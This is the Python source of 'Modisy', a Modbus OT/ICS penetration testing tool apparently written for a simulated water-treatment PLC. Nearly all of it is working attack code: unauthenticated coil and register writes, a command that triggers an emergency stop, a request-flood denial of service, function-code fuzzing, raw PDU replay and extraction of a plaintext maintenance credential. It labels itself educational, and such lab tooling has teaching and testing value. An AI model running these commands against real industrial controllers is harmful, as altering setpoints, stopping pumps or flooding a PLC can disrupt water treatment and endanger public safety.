#!/usr/bin/env python3

import socket
import struct
import sys
import time
import argparse
import json
from datetime import datetime

TARGET_HOST = '127.0.0.1'
TARGET_PORT = 502

# ── Banner ────────────────────────────────────────────────────────────────────

BANNER = """
\033[36m
 	 ███╗   ███╗ ██████╗ ██████╗ ██╗███████╗██╗   ██╗
 	 ████╗ ████║██╔═══██╗██╔══██╗██║██╔════╝╚██╗ ██╔╝
 	 ██╔████╔██║██║   ██║██║  ██║██║███████╗ ╚████╔╝ 
 	 ██║╚██╔╝██║██║   ██║██║  ██║██║╚════██║  ╚██╔╝  
 	 ██║ ╚═╝ ██║╚██████╔╝██████╔╝██║███████║   ██║   
 	 ╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚═╝╚══════╝   ╚═╝  
\033[0m\033[2m
  ╔══════════════════════════════════════════════════════════════╗
  ║  	  \033[0m\033[1mModbus OT/ICS Penetration Testing Framework\033[0m\033[2m            ║
  ║  	  \033[0m\033[33mv1.0  —  ICS / SCADA Security Assessment Tool\033[0m\033[2m          ║
  ║ 	                                                         ║
  ║ 	   \033[0m\033[36mDeveloped by  : aravind0x7\033[0m\033[2m                            ║
  ║ 	   \033[0m\033[36mGitHub        : github.com/aravind0x7\033[0m\033[2m                 ║
  ║ 	   \033[0m\033[31mFor authorized educational use only\033[0m\033[2m                   ║
  ╚══════════════════════════════════════════════════════════════╝\033[0m
"""

USAGE = """
\033[1mUsage:\033[0m  python3 modisy.py [options] <command>

\033[1mCommands:\033[0m
  \033[36mscan\033[0m          Discover Modbus devices (unit ID sweep)
  \033[36mdump\033[0m          Dump all registers and coils
  \033[36menum\033[0m          Enumerate device info (FC11, FC43)
  \033[36mfuzz\033[0m          Fuzz all function codes (0x01–0x7F)
  \033[36mcoil-write\033[0m    Write to a coil — unauthenticated (FC05)
  \033[36mreg-write\033[0m     Write to a holding register (FC06)
  \033[36mbulk-write\033[0m    Write multiple registers (FC16)
  \033[36mestop\033[0m         Trigger emergency stop on coil 7
  \033[36mreplay\033[0m        Replay a raw captured PDU (hex)
  \033[36mflood\033[0m         DoS — flood with requests (no rate limit test)
  \033[36mread-secret\033[0m   Extract maintenance code from HR[9]

\033[1mOptions:\033[0m
  \033[33m-H / --host\033[0m   Target IP   (default: 127.0.0.1)
  \033[33m-p / --port\033[0m   Target port (default: 502)
  \033[33m-u / --unit\033[0m   Modbus unit ID (default: 1)
  \033[33m-v / --verbose\033[0m Verbose output

\033[1mExamples:\033[0m
  python3 modisy.py -p 5020 scan
  python3 modisy.py -p 5020 dump
  python3 modisy.py -p 5020 enum
  python3 modisy.py -p 5020 read-secret
  python3 modisy.py -p 5020 estop
  python3 modisy.py -p 5020 coil-write 0 0
  python3 modisy.py -p 5020 reg-write 9 0xBEEF
  python3 modisy.py -p 5020 bulk-write 0 9999,5,99,1,0
  python3 modisy.py -p 5020 fuzz -v
  python3 modisy.py -p 5020 flood --count 1000
  python3 modisy.py -p 5020 replay 010000000A
"""

# ── Modbus Raw Client ─────────────────────────────────────────────────────────

class RawModbusClient:
    def __init__(self, host, port, timeout=3):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.tid = 0

    def connect(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self.timeout)
        s.connect((self.host, self.port))
        return s

    def send_raw(self, pdu, unit_id=1):
        self.tid = (self.tid + 1) % 65536
        mbap = struct.pack('>HHHB', self.tid, 0, len(pdu) + 1, unit_id)
        packet = mbap + pdu
        try:
            s = self.connect()
            s.sendall(packet)
            resp = s.recv(512)
            s.close()
            return packet, resp
        except Exception as e:
            return packet, None

    def read_coils(self, start=0, count=10, unit=1):
        pdu = struct.pack('>BHH', 0x01, start, count)
        _, resp = self.send_raw(pdu, unit)
        if not resp or len(resp) < 9: return None
        if resp[7] & 0x80:
            return {'error': resp[8]}
        bc = resp[8]
        raw = resp[9:9+bc]
        bits = []
        for i in range(count):
            bits.append(bool((raw[i//8] >> (i%8)) & 1))
        return bits

    def read_holding_regs(self, start=0, count=10, unit=1):
        pdu = struct.pack('>BHH', 0x03, start, count)
        _, resp = self.send_raw(pdu, unit)
        if not resp or len(resp) < 9: return None
        if resp[7] & 0x80:
            return {'error': resp[8]}
        bc = resp[8]
        regs = []
        for i in range(bc//2):
            regs.append(struct.unpack('>H', resp[9+i*2:11+i*2])[0])
        return regs

    def read_input_regs(self, start=0, count=10, unit=1):
        pdu = struct.pack('>BHH', 0x04, start, count)
        _, resp = self.send_raw(pdu, unit)
        if not resp or len(resp) < 9: return None
        if resp[7] & 0x80:
            return {'error': resp[8]}
        bc = resp[8]
        regs = []
        for i in range(bc//2):
            regs.append(struct.unpack('>H', resp[9+i*2:11+i*2])[0])
        return regs

    def write_coil(self, addr, value, unit=1):
        val = 0xFF00 if value else 0x0000
        pdu = struct.pack('>BHH', 0x05, addr, val)
        _, resp = self.send_raw(pdu, unit)
        if resp and len(resp) > 7:
            return not bool(resp[7] & 0x80)
        return False

    def write_register(self, addr, value, unit=1):
        pdu = struct.pack('>BHH', 0x06, addr, value)
        _, resp = self.send_raw(pdu, unit)
        if resp and len(resp) > 7:
            return not bool(resp[7] & 0x80)
        return False

    def write_multiple_registers(self, start, values, unit=1):
        count = len(values)
        bc = count * 2
        pdu = struct.pack('>BHHB', 0x10, start, count, bc)
        for v in values:
            pdu += struct.pack('>H', v & 0xFFFF)
        _, resp = self.send_raw(pdu, unit)
        if resp and len(resp) > 7:
            return not bool(resp[7] & 0x80)
        return False

    def report_server_id(self, unit=1):
        pdu = bytes([0x11])
        _, resp = self.send_raw(pdu, unit)
        return resp

    def mei_device_id(self, unit=1):
        pdu = bytes([0x2B, 0x0E, 0x01, 0x00])
        _, resp = self.send_raw(pdu, unit)
        return resp


# ── Helpers ───────────────────────────────────────────────────────────────────

def log(msg, color=None):
    colors = {
        'red':    '\033[31m',
        'green':  '\033[32m',
        'yellow': '\033[33m',
        'cyan':   '\033[36m',
        'dim':    '\033[2m',
        'bold':   '\033[1m',
    }
    reset = '\033[0m'
    ts = datetime.now().strftime('%H:%M:%S.%f')[:12]
    c = colors.get(color, '')
    print(f"\033[2m{ts}\033[0m {c}{msg}{reset}")

def target_line():
    print(f"\033[2m  Target  :\033[0m \033[36m{TARGET_HOST}:{TARGET_PORT}\033[0m")
    print(f"\033[2m  Time    :\033[0m \033[2m{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\033[0m")
    print()


# ── Attack Commands ───────────────────────────────────────────────────────────

def cmd_scan(client, args):
    """Sweep unit IDs 1-247 for responding devices."""
    log("[SCAN] Sweeping Modbus unit IDs...", 'cyan')
    target_line()
    found = []
    for uid in range(1, min(args.max_uid + 1, 248)):
        regs = client.read_holding_regs(0, 1, uid)
        if regs is not None and not isinstance(regs, dict):
            log(f"  [+] Unit ID {uid:3d}  RESPONDS  —  HR[0] = {regs[0]}", 'green')
            found.append(uid)
        elif isinstance(regs, dict):
            log(f"  [+] Unit ID {uid:3d}  RESPONDS  —  Exception code = {regs['error']}", 'yellow')
            found.append(uid)
        else:
            if args.verbose:
                log(f"  [-] Unit ID {uid:3d}  no response", 'dim')
    print()
    log(f"[SCAN] Done — {len(found)} unit(s) found: {found}", 'green' if found else 'red')
    return found


def cmd_enum(client, args):
    """Enumerate device information."""
    log("[ENUM] Reading device identification...", 'cyan')
    target_line()

    # FC11 — Report Server ID
    log("  ── FC11 (0x11)  Report Server ID ─────────────────", 'yellow')
    resp = client.report_server_id(args.unit)
    if resp and len(resp) > 9:
        raw = resp[9:]
        log(f"  Raw bytes  : {resp.hex()}", 'dim')
        try:
            decoded = raw.decode('latin-1', errors='replace').rstrip('\x00')
            log(f"  Device Info: \033[33m{decoded}\033[0m")
        except Exception:
            log(f"  Raw hex    : {raw.hex()}")
    else:
        log("  No response from FC11", 'red')

    print()

    # FC43 — MEI Device ID
    log("  ── FC43 (0x2B)  MEI Read Device Identification ───", 'yellow')
    resp2 = client.mei_device_id(args.unit)
    if resp2:
        log(f"  Raw bytes  : {resp2.hex()}", 'dim')
    else:
        log("  No response from FC43", 'red')

    print()

    # FC03 — All holding registers (includes secret)
    log("  ── FC03 (0x03)  Holding Registers (incl. secrets) ", 'yellow')
    regs = client.read_holding_regs(0, 12, args.unit)
    if regs:
        hr_names = [
            'PUMP1_SP', 'TANK_HI', 'TANK_LO', 'PRESS_MAX',
            'CL_SP', 'PH_HI', 'PH_LO', 'TEMP_SP',
            'DOSING', 'MAINT_CODE', 'SYS_MODE', 'UNIT_ID'
        ]
        for i, v in enumerate(regs):
            flag = f"  \033[33m◄ SECRET — plaintext credential\033[0m" if i == 9 else ""
            print(f"    HR[{i:2d}]  {hr_names[i]:<13}  =  {v:6d}  (0x{v:04X}){flag}")


def cmd_dump(client, args):
    """Full register and coil dump."""
    log("[DUMP] Full memory dump...", 'cyan')
    target_line()

    log("  ── FC01  Coils ────────────────────────────────────", 'yellow')
    coils = client.read_coils(0, 10, args.unit)
    if coils:
        cnames = ['PUMP1', 'PUMP2', 'VALVE_IN', 'VALVE_OUT', 'CL_DOSE',
                  'UV', 'ALARM', 'ESTOP', 'PUMP3', 'HEAT']
        for i, v in enumerate(coils):
            state = '\033[32m[ON ]\033[0m' if v else '\033[2m[OFF]\033[0m'
            print(f"    Coil[{i:2d}]  {cnames[i]:<12}  {state}")
    else:
        log("  No response", 'red')

    print()
    log("  ── FC04  Input Registers (Sensors) ────────────────", 'yellow')
    iregs = client.read_input_regs(0, 11, args.unit)
    if iregs:
        inames = ['FLOW_RATE', 'TANK_LVL', 'PRESS_IN', 'PRESS_OUT', 'TEMP',
                  'TURBIDITY', 'PH', 'CHLORINE', 'I_PUMP1', 'I_PUMP2', 'RUNTIME']
        for i, v in enumerate(iregs):
            print(f"    IR[{i:2d}]  {inames[i]:<12}  =  {v:6d}  (0x{v:04X})")
    else:
        log("  No response", 'red')

    print()
    log("  ── FC03  Holding Registers (Setpoints) ────────────", 'yellow')
    hregs = client.read_holding_regs(0, 12, args.unit)
    if hregs:
        hrnames = ['PUMP1_SP', 'TANK_HI', 'TANK_LO', 'PRESS_MAX', 'CL_SP', 'PH_HI',
                   'PH_LO', 'TEMP_SP', 'DOSING', 'MAINT_CODE', 'SYS_MODE', 'UNIT_ID']
        for i, v in enumerate(hregs):
            flag = "  \033[31m[VULN: plaintext credential]\033[0m" if i == 9 else ""
            print(f"    HR[{i:2d}]  {hrnames[i]:<12}  =  {v:6d}  (0x{v:04X}){flag}")
    else:
        log("  No response", 'red')


def cmd_coil_write(client, args):
    """Write a coil value."""
    log(f"[WRITE] FC05 — Write Single Coil", 'yellow')
    target_line()
    log(f"  Address : Coil[{args.addr}]", 'dim')
    log(f"  Value   : {args.value}  ({'ON' if int(args.value) else 'OFF'})", 'dim')
    ok = client.write_coil(args.addr, bool(int(args.value)), args.unit)
    if ok:
        log(f"  [+] SUCCESS — Coil[{args.addr}] = {'ON' if int(args.value) else 'OFF'}", 'green')
    else:
        log(f"  [-] FAILED — No response or exception", 'red')


def cmd_reg_write(client, args):
    """Write a single holding register."""
    val = int(args.value, 0) if args.value.startswith('0x') or args.value.startswith('0X') \
          else int(args.value)
    log(f"[WRITE] FC06 — Write Single Register", 'yellow')
    target_line()
    log(f"  Address : HR[{args.addr}]", 'dim')
    log(f"  Value   : {val}  (0x{val:04X})", 'dim')
    ok = client.write_register(args.addr, val & 0xFFFF, args.unit)
    if ok:
        log(f"  [+] SUCCESS — HR[{args.addr}] = {val} (0x{val:04X})", 'green')
    else:
        log(f"  [-] FAILED — No response or exception", 'red')


def cmd_bulk_write(client, args):
    """Write multiple holding registers (FC16)."""
    vals = [int(v.strip(), 0) if v.strip().startswith('0x') else int(v.strip()) & 0xFFFF
            for v in args.values.split(',')]
    log(f"[ATTACK] FC16 — Write Multiple Registers", 'red')
    target_line()
    log(f"  Start   : HR[{args.start}]", 'dim')
    log(f"  Count   : {len(vals)} registers", 'dim')
    log(f"  Values  : {vals}", 'dim')
    ok = client.write_multiple_registers(args.start, vals, args.unit)
    if ok:
        log(f"  [+] SUCCESS — {len(vals)} registers written from HR[{args.start}]", 'green')
    else:
        log(f"  [-] FAILED", 'red')


def cmd_estop(client, args):
    """Trigger Emergency Stop on coil 7."""
    log("[ATTACK] Triggering EMERGENCY STOP — Coil[7]", 'red')
    target_line()
    log("  Writing 0xFF00 to coil 7 (EMERGENCY_STOP)...", 'yellow')
    ok = client.write_coil(7, True, args.unit)
    if ok:
        log("  [+] EMERGENCY STOP ENGAGED", 'red')
        log("  All pumps halted — check HMI dashboard for process reaction", 'yellow')
        log("  Recovery: python3 modisy.py -p 5020 coil-write 7 0", 'dim')
    else:
        log("  [-] Write failed — target may be unreachable", 'red')


def cmd_read_secret(client, args):
    """Read maintenance code from HR[9]."""
    log("[RECON] Extracting maintenance credential from HR[9]...", 'cyan')
    target_line()
    regs = client.read_holding_regs(9, 1, args.unit)
    if regs:
        val = regs[0]
        log(f"  [+] Maintenance Code  : {val}  (0x{val:04X})", 'green')
        log(f"  Vulnerability         : Plaintext credential in Modbus register", 'red')
        log(f"  Function Code used    : FC03 — Read Holding Registers", 'dim')
        log(f"  Authentication needed : NONE", 'red')
    else:
        log("  [-] Read failed", 'red')


def cmd_fuzz(client, args):
    """Fuzz function codes 0x01 through 0x7F."""
    log("[FUZZ] Testing function codes 0x01 – 0x7F...", 'cyan')
    target_line()
    supported  = []
    exceptions = []

    for fc in range(1, 0x80):
        pdu = bytes([fc, 0x00, 0x00, 0x00, 0x0A])
        _, resp = client.send_raw(pdu, args.unit)
        if resp and len(resp) > 7:
            rfc = resp[7]
            if rfc & 0x80:
                exc = resp[8] if len(resp) > 8 else '?'
                exceptions.append((fc, exc))
                if args.verbose:
                    log(f"  FC 0x{fc:02X}  →  Exception  code={exc}", 'dim')
            else:
                supported.append(fc)
                log(f"  [+] FC 0x{fc:02X}  SUPPORTED  →  {resp[7:].hex()}", 'green')
        time.sleep(0.05)

    print()
    log(f"[FUZZ] Supported FCs   : {[hex(f) for f in supported]}", 'green')
    log(f"[FUZZ] Exception FCs   : {len(exceptions)} function codes responded with errors", 'yellow')
    log(f"[FUZZ] Silent / closed : {127 - len(supported) - len(exceptions)} function codes", 'dim')


def cmd_flood(client, args):
    """Flood the target with FC03 requests to test rate limiting."""
    log(f"[FLOOD] DoS test — {args.count} requests  (FC03 flood)", 'red')
    target_line()
    log("  Testing for rate limiting on PLC...", 'yellow')

    sent   = 0
    errors = 0
    t0     = time.time()

    for i in range(args.count):
        pdu = struct.pack('>BHH', 0x03, 0, 10)
        _, resp = client.send_raw(pdu, args.unit)
        if resp:
            sent += 1
        else:
            errors += 1
        if i > 0 and i % 100 == 0:
            elapsed = time.time() - t0
            rate    = i / elapsed
            log(f"  {i:>5}/{args.count}  —  {rate:>6.0f} req/s  —  {errors} errors", 'dim')

    elapsed = time.time() - t0
    rps     = sent / elapsed if elapsed > 0 else 0
    print()
    log(f"[FLOOD] Result  : {sent} OK  /  {errors} errors  in  {elapsed:.2f}s  ({rps:.0f} rps)", 'green')
    if errors < 10:
        log("[FLOOD] Finding : No rate limiting detected — PLC accepted all requests", 'red')
    else:
        log("[FLOOD] Finding : Some requests dropped — rate limiting may be present", 'yellow')


def cmd_replay(client, args):
    """Send a raw hex Modbus PDU (replay attack)."""
    log(f"[REPLAY] Sending raw hex PDU...", 'cyan')
    target_line()
    try:
        pdu = bytes.fromhex(args.hex.replace(' ', '').replace('\\x', ''))
        req, resp = client.send_raw(pdu, args.unit)
        log(f"  Sent     : {req.hex()}", 'dim')
        if resp:
            log(f"  Response : {resp.hex()}", 'yellow')
            fc = resp[7] if len(resp) > 7 else None
            if fc and fc & 0x80:
                log(f"  Exception: FC 0x{fc & 0x7F:02X}  code={resp[8] if len(resp)>8 else '?'}", 'red')
            else:
                log(f"  Status   : Success", 'green')
        else:
            log("  Response : None — target unreachable or timed out", 'red')
    except ValueError as e:
        log(f"  Error    : Invalid hex input — {e}", 'red')
    except Exception as e:
        log(f"  Error    : {e}", 'red')


# ── CLI ───────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        prog='modisy',
        description='Modisy — Modbus OT/ICS Penetration Testing Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        add_help=False,
    )
    parser.add_argument('-H', '--host',    default='127.0.0.1', help='Target IP (default: 127.0.0.1)')
    parser.add_argument('-p', '--port',    type=int, default=502, help='Target port (default: 502)')
    parser.add_argument('-u', '--unit',    type=int, default=1, help='Modbus Unit ID (default: 1)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-h', '--help',    action='store_true', help='Show help')

    sub = parser.add_subparsers(dest='cmd')

    # scan
    sc = sub.add_parser('scan')
    sc.add_argument('--max-uid', type=int, default=10)

    # dump
    sub.add_parser('dump')

    # enum
    sub.add_parser('enum')

    # coil-write
    cw = sub.add_parser('coil-write')
    cw.add_argument('addr',  type=int)
    cw.add_argument('value')

    # reg-write
    rw = sub.add_parser('reg-write')
    rw.add_argument('addr',  type=int)
    rw.add_argument('value')

    # bulk-write
    bw = sub.add_parser('bulk-write')
    bw.add_argument('start',  type=int)
    bw.add_argument('values')

    # estop
    sub.add_parser('estop')

    # read-secret
    sub.add_parser('read-secret')

    # fuzz
    sub.add_parser('fuzz')

    # flood
    fl = sub.add_parser('flood')
    fl.add_argument('--count', type=int, default=500)

    # replay
    rp = sub.add_parser('replay')
    rp.add_argument('hex')

    args = parser.parse_args()

    # Always print banner
    print(BANNER)

    if args.help or not args.cmd:
        print(USAGE)
        return

    global TARGET_HOST, TARGET_PORT
    TARGET_HOST = args.host
    TARGET_PORT = args.port

    client = RawModbusClient(args.host, args.port)

    dispatch = {
        'scan':        cmd_scan,
        'dump':        cmd_dump,
        'enum':        cmd_enum,
        'coil-write':  cmd_coil_write,
        'reg-write':   cmd_reg_write,
        'bulk-write':  cmd_bulk_write,
        'estop':       cmd_estop,
        'read-secret': cmd_read_secret,
        'fuzz':        cmd_fuzz,
        'flood':       cmd_flood,
        'replay':      cmd_replay,
    }

    fn = dispatch.get(args.cmd)
    if fn:
        try:
            fn(client, args)
            print()
        except KeyboardInterrupt:
            print()
            log("Aborted by user.", 'yellow')
        except ConnectionRefusedError:
            log(f"Connection refused — {args.host}:{args.port}", 'red')
            log("Is the PLC simulator running?  python3 plc_simulator.py 5020", 'yellow')
        except Exception as e:
            log(f"Unexpected error: {e}", 'red')
    else:
        log(f"Unknown command: {args.cmd}", 'red')
        print(USAGE)


if __name__ == '__main__':
    main()
